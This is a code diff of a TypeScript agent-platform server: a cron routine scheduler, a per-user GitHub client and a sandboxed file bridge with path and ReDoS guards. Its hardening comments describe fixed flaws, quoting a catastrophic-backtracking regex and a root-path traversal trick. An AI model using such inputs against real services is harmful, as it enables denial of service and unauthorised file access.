+      name: params.name,
+      prompt: params.prompt,
+      cronExpression: params.cronExpression,
+      workspacePath: params.workspacePath,
+      modelId: params.modelId ?? 'default',
+      enabled: true,
+      createdAt: nowSec(),
+      lastRun: null,
+      lastResult: null,
+      nextRun: this.nextRunTime(params.cronExpression),
+    }
+    this.routines.set(id, routine)
+    this.persist()
+    this.startScheduler()
+    return routine
+  }
+
+  update(
+    id: string,
+    userId: string,
+    updates: Partial<Omit<Routine, 'id' | 'createdAt' | 'userUuid'>>,
+  ): Routine | null {
+    this.ensureLoaded()
+    const r = this.get(id, userId)
+    if (!r) return null
+    const updated = { ...r, ...updates, id: r.id, createdAt: r.createdAt, userUuid: r.userUuid }
+    if (updates.cronExpression && updates.cronExpression !== r.cronExpression) {
+      updated.nextRun = this.nextRunTime(updates.cronExpression)
+    }
+    this.routines.set(id, updated)
+    this.persist()
+    return updated
+  }
+
+  delete(id: string, userId: string): boolean {
+    this.ensureLoaded()
+    if (!this.get(id, userId)) return false
+    const deleted = this.routines.delete(id)
+    if (deleted) this.persist()
+    return deleted
+  }
+
+  /** 用户手动触发:仅属主可触发(F-301)。调度器内部走 runRoutine,不受此限。 */
+  trigger(id: string, userId: string): string | null {
+    this.ensureLoaded()
+    const r = this.get(id, userId)
+    if (!r) return null
+    return this.runRoutine(r)
+  }
+
+  private runRoutine(r: Routine): string | null {
+    if (!r.enabled) return null
+    const agentId = backgroundAgentManager.start({
+      prompt: r.prompt,
+      workspacePath: r.workspacePath,
+      modelId: r.modelId,
+    })
+    r.lastRun = nowSec()
+    r.lastResult = `已触发后台 agent: ${agentId}`
+    r.nextRun = this.nextRunTime(r.cronExpression)
+    this.persist()
+    return agentId
+  }
+
+  /**
+   * 启动调度器（每 60 秒检查一次 cron 匹配）。
+   *
+   * F-302:本方法此前在模块体末尾被无条件调用,而 API 与 worker 两个入口
+   * (index.ts / worker-entry.ts)都经 buildServer() 载入本模块 ⇒ 两进程各起一份,
+   * 同一分钟对同一份 routines.json 各触发一次,persist 还整文件互相覆盖。
+   * 现改为只由 API 角色、在 index.ts 的 startBackgroundSchedulers(蓝绿活跃色独占
+   * 判定之后)调用一次;其它角色调用被显式拒绝,同进程重复调用幂等(返回 false)。
+   *
+   * @returns 本次调用是否真的起了一个定时器
+   */
+  startScheduler(): boolean {
+    if (this.timer) return false
+    const role = getProcessRole()
+    if (role !== 'api') {
+      logger.warn('例行程序调度器只在 API 角色启动,本次调用被拒绝', { role })
+      return false
+    }
+    this.timer = setInterval(() => this.tick(), 60_000)
+    return true
+  }
+
+  stopScheduler(): void {
+    if (this.timer) {
+      clearInterval(this.timer)
+      this.timer = null
+    }
+  }
+
+  /**
+   * F-303:定时器回调绝不能往外抛 —— 一步 setInterval 回调里的异常就是
+   * uncaughtException,直接打死 API 进程。两级隔离:
+   *   ① 单条 routine 的 runRoutine(含其 persist 写盘)失败只降级为 error 日志,不中断其它 routine;
+   *   ② tick 整体再兜一层,保证任何意外(含 ensureLoaded)都不逸出到定时器。
+   * persist 失败不吞在 persist 里:create/update/delete 等请求路径仍要把错误回给调用方。
+   */
+  private tick(): void {
+    try {
+      this.ensureLoaded()
+      const now = nowSec()
+      for (const r of this.routines.values()) {
+        if (!r.enabled || r.nextRun === null) continue
+        if (r.nextRun > now) continue
+        try {
+          this.runRoutine(r)
+        } catch (error) {
+          logger.error('例行程序触发失败,已跳过本轮', {
+            routineId: r.id,
+            error: error instanceof Error ? error.message : String(error),
+          })
+        }
+      }
+    } catch (error) {
+      logger.error('例行程序调度 tick 失败,下一次心跳继续', {
+        error: error instanceof Error ? error.message : String(error),
+      })
+    }
+  }
+
+  /** 简化 cron 解析：计算下次执行时间（5 字段：分 时 日 月 周） */
+  private nextRunTime(cron: string): number {
+    const parts = cron.trim().split(/\s+/)
+    if (parts.length !== 5) return nowSec() + 86400
+    const min = parts[0]!
+    const hour = parts[1]!
+    const dom = parts[2]!
+    const mon = parts[3]!
+    const dow = parts[4]!
+    const now = new Date()
+    // 简化：从当前时间起每分钟扫描，找到第一个匹配的未来时间（最多扫描 7 天）
+    const next = new Date(now.getTime() + 60000)
+    for (let i = 0; i < 10080; i++) {
+      const t = new Date(next.getTime() + i * 60000)
+      if (
+        this.cronMatch(min, t.getMinutes(), 0, 59) &&
+        this.cronMatch(hour, t.getHours(), 0, 23) &&
+        this.cronMatch(dom, t.getDate(), 1, 31) &&
+        this.cronMatch(mon, t.getMonth() + 1, 1, 12) &&
+        this.cronMatch(dow, t.getDay(), 0, 6)
+      ) {
+        return Math.floor(t.getTime() / 1000)
+      }
+    }
+    return nowSec() + 86400
+  }
+
+  private cronMatch(pattern: string, value: number, min: number, max: number): boolean {
+    if (pattern === '*') return true
+    for (const part of pattern.split(',')) {
+      if (part === '*') return true
+      if (part.includes('/')) {
+        const slashParts = part.split('/')
+        const range = slashParts[0] ?? '*'
+        const step = parseInt(slashParts[1] ?? '1', 10)
+        const lo = range === '*' ? min : parseInt(range, 10)
+        if (value >= lo && (value - lo) % step === 0) return true
+      } else if (part.includes('-')) {
+        const rangeParts = part.split('-').map((n) => parseInt(n, 10))
+        const lo = rangeParts[0] ?? 0
+        const hi = rangeParts[1] ?? 0
+        if (value >= lo && value <= hi) return true
+      } else {
+        if (parseInt(part, 10) === value) return true
+      }
+    }
+    void max
+    return false
+  }
+
+  private persist(): void {
+    if (this.blockedWrite) throw new Error(this.blockedWrite)
+    writeJson(routinesFile(), Array.from(this.routines.values()))
+  }
+}
+
+export const routineManager = new RoutineManager()
+
+// =============================================================================
+// 14. GitHubIntegration — GitHub 集成（PR/Issue/代码审查）
+// =============================================================================
+
+const GITHUB_API_BASE = 'https://api.github.com'
+
+/**
+ * F-442:GitHub 令牌按用户隔离落库(user_preferences,值经 AES-256-GCM 加密),
+ * 不再读写全站共享的 `~/.ihui/github_token`。
+ * group 仅本文件使用,故不扩 USER_PREFERENCE_GROUPS(避免触碰非本工单文件)。
+ */
+const GITHUB_TOKEN_GROUP = 'workspace_github'
+const GITHUB_TOKEN_KEY = 'token'
+
+class GitHubClient {
+  /**
+   * 读取**调用者自己**的令牌。未存过时回落部署级 env(平台令牌,用户不可写),
+   * 绝不回落到任何共享文件或他人记录。
+   */
+  async loadTokenForUser(userId: string): Promise<string> {
+    const { findUserPreferences } = await import('../db/user-preferences-queries.js')
+    const { list } = await findUserPreferences(userId, GITHUB_TOKEN_GROUP)
+    const row = list.find((p) => p.key === GITHUB_TOKEN_KEY)
+    if (row?.value) return decryptField(row.value).trim()
+    return (process.env.GITHUB_TOKEN ?? '').trim()
+  }
+
+  async hasTokenForUser(userId: string): Promise<boolean> {
+    return (await this.loadTokenForUser(userId)).length > 0
+  }
+
+  /**
+   * F-444:只读**调用者自己**的令牌,绝不回落部署级平台令牌。
+   * 接收调用方指定 owner/repo 的读写/合并端点必须过这道闸,
+   * 否则没有个人令牌的用户会拿平台 PAT 代理操作任意他人仓库。
+   */
+  async loadOwnTokenForUser(userId: string): Promise<string> {
+    const { findUserPreferences } = await import('../db/user-preferences-queries.js')
+    const { list } = await findUserPreferences(userId, GITHUB_TOKEN_GROUP)
+    const row = list.find((p) => p.key === GITHUB_TOKEN_KEY)
+    if (row?.value) return decryptField(row.value).trim()
+    return ''
+  }
+
+  async hasOwnTokenForUser(userId: string): Promise<boolean> {
+    return (await this.loadOwnTokenForUser(userId)).length > 0
+  }
+
+  /** 加密后按 userId 落库;覆盖只影响该用户自己的行。 */
+  async saveTokenForUser(userId: string, token: string): Promise<void> {
+    const { upsertUserPreference } = await import('../db/user-preferences-queries.js')
+    await upsertUserPreference(
+      userId,
+      GITHUB_TOKEN_GROUP,
+      GITHUB_TOKEN_KEY,
+      encryptField(token.trim()),
+    )
+  }
+
+  /** 只删除该用户自己的令牌;返回是否确有一行被删。 */
+  async clearTokenForUser(userId: string): Promise<boolean> {
+    const { deleteUserPreference } = await import('../db/user-preferences-queries.js')
+    return deleteUserPreference(userId, GITHUB_TOKEN_GROUP, GITHUB_TOKEN_KEY)
+  }
+
+  parseRemote(url: string): { owner: string; repo: string } | null {
+    const httpsRe = /https?:\/\/github\.com[:/]([^/]+)\/([^/]+?)(?:\.git)?\/?$/
+    const sshRe = /git@github\.com:([^/]+)\/([^/]+?)(?:\.git)?$/
+    const m = httpsRe.exec(url) ?? sshRe.exec(url)
+    return m ? { owner: m[1]!, repo: m[2]! } : null
+  }
+
+  async detectRemote(workspacePath: string): Promise<{ owner: string; repo: string } | null> {
+    try {
+      const { stdout } = await execAsync('git remote get-url origin', {
+        cwd: workspacePath,
+        timeout: 5000,
+        windowsHide: true,
+      })
+      return this.parseRemote(stdout.trim())
+    } catch {
+      return null
+    }
+  }
+
+  private async api(
+    userId: string,
+    path: string,
+    method = 'GET',
+    body?: unknown,
+  ): Promise<unknown> {
+    const token = await this.loadTokenForUser(userId)
+    if (!token) throw new Error('未配置 GITHUB_TOKEN')
+    const res = await fetch(`${GITHUB_API_BASE}${path}`, {
+      method,
+      headers: {
+        Authorization: `Bearer ${token}`,
+        Accept: 'application/vnd.github+json',
+        'X-GitHub-Api-Version': '2022-11-28',
+        'Content-Type': 'application/json',
+      },
+      body: body ? JSON.stringify(body) : undefined,
+    })
+    if (!res.ok) {
+      const errText = await res.text()
+      throw new Error(`GitHub API ${res.status}: ${errText}`)
+    }
+    return res.status === 204 ? null : res.json()
+  }
+
+  async createPR(params: {
+    userId: string
+    owner: string
+    repo: string
+    title: string
+    head: string
+    base: string
+    body?: string
+    /** D183(2026-09-29):true = 创建 Draft PR(环境信息 popover 一键创建入口) */
+    draft?: boolean
+  }): Promise<unknown> {
+    return this.api(params.userId, `/repos/${params.owner}/${params.repo}/pulls`, 'POST', {
+      title: params.title,
+      head: params.head,
+      base: params.base,
+      body: params.body ?? '',
+      draft: params.draft ?? false,
+    })
+  }
+
+  async listPRs(params: {
+    userId: string
+    owner: string
+    repo: string
+    state?: string
+  }): Promise<unknown> {
+    const state = params.state ?? 'open'
+    return this.api(
+      params.userId,
+      `/repos/${params.owner}/${params.repo}/pulls?state=${state}&per_page=30`,
+    )
+  }
+
+  async getPR(params: {
+    userId: string
+    owner: string
+    repo: string
+    number: number
+  }): Promise<unknown> {
+    return this.api(params.userId, `/repos/${params.owner}/${params.repo}/pulls/${params.number}`)
+  }
+
+  /** F-Forge(2026-11-13):列某 commit 的 CI 检查(check-runs),供变更请求台账汇总。 */
+  async listCheckRuns(params: {
+    userId: string
+    owner: string
+    repo: string
+    ref: string
+  }): Promise<unknown> {
+    const ref = encodeURIComponent(params.ref)
+    return this.api(
+      params.userId,
+      `/repos/${params.owner}/${params.repo}/commits/${ref}/check-runs?per_page=100`,
+    )
+  }
+
+  async addPRComment(params: {
+    userId: string
+    owner: string
+    repo: string
+    number: number
+    body: string
+  }): Promise<unknown> {
+    return this.api(
+      params.userId,
+      `/repos/${params.owner}/${params.repo}/issues/${params.number}/comments`,
+      'POST',
+      {
+        body: params.body,
+      },
+    )
+  }
+
+  async requestReview(params: {
+    userId: string
+    owner: string
+    repo: string
+    number: number
+    reviewers: string[]
+  }): Promise<unknown> {
+    return this.api(
+      params.userId,
+      `/repos/${params.owner}/${params.repo}/pulls/${params.number}/requested_reviewers`,
+      'POST',
+      {
+        reviewers: params.reviewers,
+      },
+    )
+  }
+
+  async mergePR(params: {
+    userId: string
+    owner: string
+    repo: string
+    number: number
+    commitTitle?: string
+    mergeMethod?: 'merge' | 'squash' | 'rebase'
+  }): Promise<unknown> {
+    return this.api(
+      params.userId,
+      `/repos/${params.owner}/${params.repo}/pulls/${params.number}/merge`,
+      'PUT',
+      {
+        commit_title: params.commitTitle,
+        merge_method: params.mergeMethod ?? 'merge',
+      },
+    )
+  }
+
+  async listIssues(params: {
+    userId: string
+    owner: string
+    repo: string
+    state?: string
+  }): Promise<unknown> {
+    const state = params.state ?? 'open'
+    return this.api(
+      params.userId,
+      `/repos/${params.owner}/${params.repo}/issues?state=${state}&per_page=30`,
+    )
+  }
+}
+
+export const githubClient = new GitHubClient()
+
+// =============================================================================
+// 15. FSBridge — 文件系统桥接（browse/read/write/edit/grep/glob/run）
+// =============================================================================
+
+export interface BrowseEntry {
+  name: string
+  path: string
+  isDir: boolean
+  size: number
+  modified: number
+}
+
+class FSBridge {
+  browse(path?: string): BrowseEntry[] {
+    // 2026-10-27 收口:原实现压根没有 workspacePath 概念 —— 无 path 时枚举 `A:\`~`Z:\`
+    // 全部盘符、有 path 时 resolve() 完直接 readdirSync,等于给任意登录用户一台「服务器
+    // 文件系统浏览器」。现只允许列举服务端登记的根及其子目录;无 path 返回登记根。
+    const roots = getRegisteredWorkspaceRoots()
+    if (!path) {
+      if (roots.length === 0) {
+        throw new Error('文件桥未启用:服务端未登记任何工作区根(IHUI_WORKSPACE_ROOTS 为空)')
+      }
+      return roots.map((r) => ({
+        name: basename(r),
+        path: r,
+        isDir: true,
+        size: 0,
+        modified: 0,
+      }))
+    }
+
+    const p = realpathOrResolve(path)
+    if (!roots.some((r) => isInsideRoot(p, r))) {
+      throw new Error('路径越界：只能浏览服务端已登记的工作区')
+    }
+    if (!existsSync(p)) throw new Error(`路径不存在: ${path}`)
+    const st = statSync(p)
+    if (!st.isDirectory()) throw new Error(`不是目录: ${path}`)
+
+    const entries: BrowseEntry[] = []
+    for (const name of readdirSync(p)) {
+      if (name.startsWith('.') || IGNORE_DIRS.has(name)) continue
+      try {
+        const full = join(p, name)
+        const fst = statSync(full)
+        entries.push({
+          name,
+          path: full,
+          isDir: fst.isDirectory(),
+          size: fst.isDirectory() ? 0 : fst.size,
+          modified: fst.mtime.getTime() / 1000,
+        })
+      } catch {
+        continue
+      }
+    }
+    return entries.sort((a, b) =>
+      a.isDir === b.isDir ? a.name.localeCompare(b.name) : a.isDir ? -1 : 1,
+    )
+  }
+
+  read(params: { path: string; workspacePath: string; startLine?: number; endLine?: number }): {
+    content: string
+    lines: number
+    path: string
+  } {
+    const full = this.resolvePath(params.path, params.workspacePath)
+    if (!existsSync(full)) throw new Error(`文件不存在: ${params.path}`)
+    const content = readFileSync(full, 'utf-8')
+    const lines = content.split('\n')
+    if (params.startLine || params.endLine) {
+      const start = (params.startLine ?? 1) - 1
+      const end = params.endLine ?? lines.length
+      return { content: lines.slice(start, end).join('\n'), lines: end - start, path: params.path }
+    }
+    return { content, lines: lines.length, path: params.path }
+  }
+
+  write(params: { path: string; workspacePath: string; content: string; createDirs?: boolean }): {
+    path: string
+    size: number
+  } {
+    // 越界与登记校验已收进 resolvePath(单点判据,不再各处补第二把尺子)
+    const full = this.resolvePath(params.path, params.workspacePath)
+    if (params.createDirs !== false) ensureDir(dirname(full))
+    // 检查点快照
+    if (existsSync(full)) {
+      checkpointManager.snapshot(params.workspacePath, {
+        tool: 'write',
+        description: `写入文件: ${params.path}`,
+        files: [params.path],
+      })
+    }
+    writeFileSync(full, params.content, 'utf-8')
+    return { path: params.path, size: params.content.length }
+  }
+
+  edit(params: { path: string; workspacePath: string; oldText: string; newText: string }): {
+    path: string
+    occurrences: number
+  } {
+    // 越界与登记校验已收进 resolvePath(单点判据,不再各处补第二把尺子)
+    const full = this.resolvePath(params.path, params.workspacePath)
+    if (!existsSync(full)) throw new Error(`文件不存在: ${params.path}`)
+    checkpointManager.snapshot(params.workspacePath, {
+      tool: 'edit',
+      description: `编辑文件: ${params.path}`,
+      files: [params.path],
+    })
+    const content = readFileSync(full, 'utf-8')
+    const count = content.split(params.oldText).length - 1
+    if (count === 0) throw new Error('未找到匹配的文本')
+    if (count > 1) throw new Error('匹配不唯一，请提供更多上下文')
+    writeFileSync(full, content.replace(params.oldText, params.newText), 'utf-8')
+    return { path: params.path, occurrences: count }
+  }
+
+  delete(params: { path: string; workspacePath: string; recursive?: boolean }): {
+    path: string
+    deleted: boolean
+  } {
+    // 越界与登记校验已收进 resolvePath(单点判据,不再各处补第二把尺子)
+    const full = this.resolvePath(params.path, params.workspacePath)
+    checkpointManager.snapshot(params.workspacePath, {
+      tool: 'delete',
+      description: `删除文件: ${params.path}`,
+      files: [params.path],
+    })
+    // rmSync 的 force:true 对"路径本就不存在"不抛错也不删任何东西 ⇒
+    // deleted 不能写字面量,必须以删前磁盘实况判定(与"库里真少了一行"同语义)
+    const existedBefore = existsSync(full)
+    rmSync(full, { recursive: params.recursive ?? false, force: true })
+    return { path: params.path, deleted: existedBefore }
+  }
+
+  /** regex 条件的 pattern 与被测行长度上限(主线程同步执行,防 ReDoS 放大;与 rules/webhooks-trigger 同口径) */
+  static readonly MAX_GREP_PATTERN_LENGTH = 200
+  static readonly MAX_GREP_LINE_LENGTH = 10 * 1024
+
+  grep(params: {
+    path: string
+    workspacePath: string
+    pattern: string
+    glob?: string
+    outputMode?: 'content' | 'files_with_matches' | 'count'
+    /** 内容模式最多收集多少条命中（防内存与上下文双爆，2026-11-20） */
+    maxMatches?: number
+    /** 单文件最多记多少条命中（防一个巨型文件吃光预算） */
+    perFileMatches?: number
+    /** files_with_matches / count 模式最多记多少个文件 */
+    maxFiles?: number
+    /** 真大小写敏感（默认不敏感，与既有行为一致） */
+    caseSensitive?: boolean
+  }): {
+    matches?: Array<{ file: string; line: number; content: string }>
+    files?: string[]
+    counts?: Record<string, number>
+    total: number
+    truncated: boolean
+  } {
+    // ReDoS 运行闸(2026-10-31 安全强化第 11 批):主线程同步正则,超长 pattern 直接拒绝
+    if (params.pattern.length > FSBridge.MAX_GREP_PATTERN_LENGTH) {
+      throw new Error(`pattern 超过 ${FSBridge.MAX_GREP_PATTERN_LENGTH} 字符上限`)
+    }
+    // 2026-11-01 安全强化:长度上限拦不住 `(a+)+$` 这类**短而病态**的模式 —— 一枚几十字符的
+    // 嵌套量词就能把主线程钉住几十秒(整个 API 停摆)。本仓已有同一判据(rules-service 的
+    // hasNestedQuantifier,已接进规则编辑面),这里复用它而不是另造一份(§0.6)。
+    if (hasNestedQuantifier(params.pattern)) {
+      throw new Error('pattern 含嵌套量词(如 (a+)+),存在指数级回溯风险,已拒绝')
+    }
+    const root = this.resolvePath(params.path, params.workspacePath)
+    const regex = params.caseSensitive
+      ? new RegExp(params.pattern)
+      : new RegExp(params.pattern, 'i')
+    const globRe = params.glob ? this.globToRegex(params.glob) : null
+    const mode = params.outputMode ?? 'content'
+    const matches: Array<{ file: string; line: number; content: string }> = []
+    const fileMatches: string[] = []
+    const counts: Record<string, number> = {}
+    const budget = {
+      maxMatches: params.maxMatches ?? Number.POSITIVE_INFINITY,
+      perFileMatches: params.perFileMatches ?? Number.POSITIVE_INFINITY,
+      maxFiles: params.maxFiles ?? Number.POSITIVE_INFINITY,
+      exhausted: false,
+      truncated: false,
+    }
+    this.walkGrep(root, root, regex, globRe, matches, fileMatches, counts, budget)
+    if (mode === 'files_with_matches') {
+      return {
+        files: fileMatches,
+        total: fileMatches.length,
+        truncated: budget.truncated,
+      }
+    }
+    if (mode === 'count') {
+      return {
+        counts,
+        total: Object.keys(counts).length,
+        truncated: budget.truncated,
+      }
+    }
+    return { matches, total: matches.length, truncated: budget.truncated }
+  }
+
+  glob(params: {
+    path: string
+    workspacePath: string
+    pattern: string
+    /** 最多收集多少个文件（防超大仓一次回几万条，2026-11-20） */
+    maxFiles?: number
+  }): { files: string[]; total: number; truncated: boolean } {
+    const root = this.resolvePath(params.path, params.workspacePath)
+    const regex = this.globToRegex(params.pattern)
+    const files: string[] = []
+    const budget = {
+      maxFiles: params.maxFiles ?? Number.POSITIVE_INFINITY,
+      exhausted: false,
+      truncated: false,
+    }
+    this.walkGlob(root, root, regex, files, budget)
+    return { files, total: files.length, truncated: budget.truncated }
+  }
+
+  async run(params: {
+    command: string
+    workspacePath: string
+    cwd?: string
+    timeoutMs?: number
+    mode?: SandboxMode
+    /** 2026-10-31 R8 复评 F1:解释器族仅 admin,由路由层透传 */
+    isAdmin?: boolean
+  }): Promise<{ stdout: string; stderr: string; exitCode: number | null }> {
+    return sandboxExecutor.execute({
+      command: params.command,
+      workspacePath: params.workspacePath,
+      cwd: params.cwd,
+      mode: params.mode ?? 'workspace-write',
+      timeoutMs: params.timeoutMs,
+      isAdmin: params.isAdmin,
+    })
+  }
+
+  /** 记录最近工作区(按 userId 隔离,F-278) */
+  addRecent(userId: string, meta: { path: string; name: string; techStack?: string[] }): void {
+    const file = recentWorkspacesFile(userId)
+    const list = readJsonForUpdate<Array<{ path: string; name: string; lastOpened: number }>>(
+      file,
+      [],
+      '最近工作区读不到,不能把它覆盖成只剩刚打开的这一条',
+    )
+    if (!Array.isArray(list)) {
+      throw new Error('最近工作区读不到,不能把它覆盖成只剩刚打开的这一条 (parse)')
+    }
+    const filtered = list.filter((w) => w.path !== meta.path)
+    filtered.unshift({ path: meta.path, name: meta.name, lastOpened: nowSec() })
+    writeJson(file, filtered.slice(0, 20))
+  }
+
+  /**
+   * 读取该用户自己的最近工作区,并过滤「已配置权限但被明确拒绝」的条目(F-278)。
+   *
+   * 这里用 enumerateOnly 调 checkWorkspace:只读列表不因「需人工确认」而阻塞
+   * (否则 N 条 recent × 60s 人工审计会把 GET /fs/recent 拖死),但硬 deny 仍被过滤。
+   * 未配置权限的条目保留 —— /fs/open 先写 recent 再引导 setup,过滤掉会让首开工作区消失。
+   */
+  async loadRecent(
+    userId: string,
+  ): Promise<Array<{ path: string; name: string; lastOpened: number }>> {
+    const list = readJson<Array<{ path: string; name: string; lastOpened: number }>>(
+      recentWorkspacesFile(userId),
+      [],
+    )
+    if (!Array.isArray(list)) return []
+    const visible: Array<{ path: string; name: string; lastOpened: number }> = []
+    for (const item of list) {
+      if (!item || typeof item.path !== 'string' || !item.path) continue
+      const decision = await permissionManager.checkWorkspace({
+        userId,
+        workspacePath: item.path,
+        tool: 'fs.browse',
+        args: { path: item.path },
+        enumerateOnly: true,
+      })
+      if (decision.allowed || !decision.configured) visible.push(item)
+    }
+    return visible
+  }
+
+  detectTechStack(workspacePath: string): string[] {
+    const stack: string[] = []
+    if (existsSync(join(workspacePath, 'package.json'))) stack.push('node')
+    if (
+      existsSync(join(workspacePath, 'pyproject.toml')) ||
+      existsSync(join(workspacePath, 'requirements.txt'))
+    )
+      stack.push('python')
+    if (existsSync(join(workspacePath, 'go.mod'))) stack.push('go')
+    if (existsSync(join(workspacePath, 'Cargo.toml'))) stack.push('rust')
+    if (
+      existsSync(join(workspacePath, 'pom.xml')) ||
+      existsSync(join(workspacePath, 'build.gradle'))
+    )
+      stack.push('java')
+    return stack
+  }
+
+  /**
+   * 工作区登记闸(2026-10-27 加固):workspacePath 必须是服务端 env 白名单内的根之一。
+   *
+   * 此前它全程是**客户端自报字符串**:传 `workspacePath="C:\\"` 就让「文件须落在工作区内」
+   * 这条判据自我成立,于是 write/read/grep 全部指向整台生产机;现网 `workspace_permissions`
+   * 实测 0 行(无人用过这套授权),故默认拒绝无现实损失。
+   * 判据住在 utils/workspace-roots.ts 单源,本方法只是薄封装(§0.6)。
+   */
+  assertWorkspaceRegistered(workspacePath: string): string {
+    return assertWithinRegisteredRoots(workspacePath, '工作区')
+  }
+
+  /** 公开只读出口:工具层的观察表要与文件桥共用同一把路径尺子(不得各算一份)。 */
+  resolvePath(p: string, workspacePath: string): string {
+    // 归一后的登记根才是比较基准(客户端串可能是符号链接,拿它当根等于自证清白)
+    const root = this.assertWorkspaceRegistered(workspacePath)
+    const full = realpathOrResolve(isAbsolute(p) ? resolve(p) : resolve(root, p))
+    if (!isInsideRoot(full, root)) {
+      throw new Error('路径越界：不能操作工作区外的文件')
+    }
+    return full
+  }
+
+  private globToRegex(pattern: string): RegExp {
+    let p = pattern.replace(/\*\*/g, '\x00')
+    p = p.replace(/[.+^${}()|[\]\\]/g, '\\$&')
+    p = p.replace(/\*/g, '[^/]*')
+    p = p.replace(/\?/g, '[^/]')
+    // `**/` 必须能匹配「零层目录」（2026-11-20）：`**/*.ts` 要能命中顶层 `x.ts`，
+    // 而朴素替换得到的是 `.*/[^/]*\.ts`，顶层文件永远差一个斜杠 —— 这是 glob 语义塌陷。
+    p = p.replace(/\x00\//g, '(?:.*/)?')
+    p = p.replace(/\x00/g, '.*')
+    return new RegExp(`^${p}$`)
+  }
+
+  private walkGrep(
+    root: string,
+    dir: string,
+    regex: RegExp,
+    globRe: RegExp | null,
+    matches: Array<{ file: string; line: number; content: string }>,
+    fileMatches: string[],
+    counts: Record<string, number>,
+    budget: {
+      maxMatches: number
+      perFileMatches: number
+      maxFiles: number
+      exhausted: boolean
+      truncated: boolean
+    },
+  ): void {
+    if (budget.exhausted) return
+    let entries: string[]
+    try {
+      entries = readdirSync(dir)
+    } catch {
+      return
+    }
+    for (const name of entries) {
+      if (budget.exhausted) return
+      if (IGNORE_DIRS.has(name)) continue
+      const full = join(dir, name)
+      let st
+      try {
+        st = statSync(full)
+      } catch {
+        continue
+      }
+      if (st.isDirectory()) {
+        this.walkGrep(root, full, regex, globRe, matches, fileMatches, counts, budget)
+      } else if (st.isFile()) {
+        if (globRe && !globRe.test(name)) continue
+        if (st.size > MAX_FILE_SIZE) continue
+        let content: string
+        try {
+          content = readFileSync(full, 'utf-8')
+        } catch {
+          continue
+        }
+        // 二进制跳过（2026-11-20）：与 read_file 同一条判据，别把 NUL 乱码当命中
+        if (content.slice(0, 512).includes('\u0000')) continue
+        const relPath = relative(root, full).split(sep).join('/')
+        let count = 0
+        const lines = content.split('\n')
+        for (let idx = 0; idx < lines.length; idx++) {
+          if (budget.exhausted) break
+          if (count >= budget.perFileMatches) {
+            budget.truncated = true
+            break
+          }
+          const line = lines[idx] ?? ''
+          if (line.length > FSBridge.MAX_GREP_LINE_LENGTH) continue
+          if (!regex.test(line)) continue
+          count++
+          if (matches.length >= budget.maxMatches) {
+            budget.exhausted = true
+            budget.truncated = true
+            break
+          }
+          matches.push({ file: relPath, line: idx + 1, content: line })
+        }
+        if (count > 0) {
+          if (fileMatches.length >= budget.maxFiles) {
+            budget.truncated = true
+          } else {
+            fileMatches.push(relPath)
+            counts[relPath] = count
+          }
+        }
+      }
+    }
+  }
+
+  private walkGlob(
+    root: string,
+    dir: string,
+    regex: RegExp,
+    files: string[],
+    budget: { maxFiles: number; exhausted: boolean; truncated: boolean },
+  ): void {
+    if (budget.exhausted) return
+    let entries: string[]
+    try {
+      entries = readdirSync(dir)
+    } catch {
+      return
+    }
+    for (const name of entries) {
+      if (budget.exhausted) return
+      if (IGNORE_DIRS.has(name)) continue
+      const full = join(dir, name)
+      let st
+      try {
+        st = statSync(full)
+      } catch {
+        continue
+      }
+      const relPath = relative(root, full).split(sep).join('/')
+      if (st.isDirectory()) {
+        this.walkGlob(root, full, regex, files, budget)
+      } else if (st.isFile() && regex.test(relPath)) {
+        if (files.length >= budget.maxFiles) {
+          budget.exhausted = true
+          budget.truncated = true
+          return
+        }
+        files.push(relPath)
+      }
+    }
+  }
+}
+
+export const fsBridge = new FSBridge()
+/** 工具层观察表(进程内):read_file 写入观察,write_file 据此拒绝盲写/过期覆盖。 */
+const fsObservationStore = new FsObservationStore()
+
+// =============================================================================
+// 初始化：注册 AgentLoop 内置工具（FS Bridge 工具集）
+// =============================================================================
+
+/**
+ * `read_file` 的两道护栏（2026-11-20）：
+ * - 二进制：前 8KB 出现 NUL 字节就判二进制，别把乱码当文本灌进上下文（要看文档用 parse_document）；
+ * - 超大：一次读回超过 12 万字符就截断并给续读指引（range 读或 grep），避免单条工具结果吃掉整个预算。
+ * 截断只影响回给模型的那段；观察态仍记整文件摘要，后续 edit_file/write_file 的版本校验不受影响。
+ */
+const READ_BINARY_PROBE_CHARS = 8_000
+const READ_TRUNCATE_CHARS = 120_000
+
+agentLoop.registerTool({
+  name: 'read_file',
+  description: '读取文件内容（支持 startLine/endLine 分段读；二进制与超大文件有护栏）',
+  execute: async (args) => {
+    const path = String(args['path'] ?? '')
+    const workspacePath = String(args['workspacePath'] ?? process.cwd())
+    const full = fsBridge.resolvePath(path, workspacePath)
+    const raw = readFileSync(full, 'utf-8')
+    if (raw.slice(0, READ_BINARY_PROBE_CHARS).includes('\u0000')) {
+      return JSON.stringify({
+        ok: false,
+        code: 'FS_BINARY_FILE',
+        error: '目标看起来是二进制文件，按文本读会得到乱码',
+        remedy: '文档类内容用 parse_document；确需看原始字节请说明用途再定通道。',
+      })
+    }
+    // 读即观察:整文件读入才记摘要,后续 write_file 用它判断"看的是不是磁盘这一版"
+    fsObservationStore.observePresent(full, raw)
+    const startLine = Number(args['startLine'] ?? Number.NaN)
+    const endLine = Number(args['endLine'] ?? Number.NaN)
+    if (Number.isFinite(startLine) || Number.isFinite(endLine)) {
+      return fsBridge.read({
+        path,
+        workspacePath,
+        startLine: Number.isFinite(startLine) ? startLine : undefined,
+        endLine: Number.isFinite(endLine) ? endLine : undefined,
+      }).content
+    }
+    if (raw.length > READ_TRUNCATE_CHARS) {
+      const totalLines = raw.split('\n').length
+      return (
+        raw.slice(0, READ_TRUNCATE_CHARS) +
+        `\n… [read_file 截断：文件 ${raw.length} 字符 / ${totalLines} 行，仅返回前 ${READ_TRUNCATE_CHARS} 字符；` +
+        '用 startLine/endLine 续读，或先 grep 定位] …\n'
+      )
+    }
+    return raw
+  },
+})
+
+/**
+ * `list_dir` 条目上限（2026-11-20）：大目录（构建产物、媒体库）一次回几千条会把上下文
+ * 挤满，且模型看不过来。默认 200，可用 limit 提到 1000；超出时 total/truncated 由回包自述。
+ */
+const LIST_DIR_MAX_ENTRIES = 200
+const LIST_DIR_HARD_CAP = 1_000
+
+agentLoop.registerTool({
+  name: 'list_dir',
+  description:
+    '列出目录内容（默认最多 200 条；返回 {ok,total,truncated,entries}，truncated=true 时用更具体的 path 深入或先 grep 定位）',
+  execute: async (args) => {
+    const entries = fsBridge.browse(String(args['path'] ?? ''))
+    const rawLimit = Number(args['limit'] ?? Number.NaN)
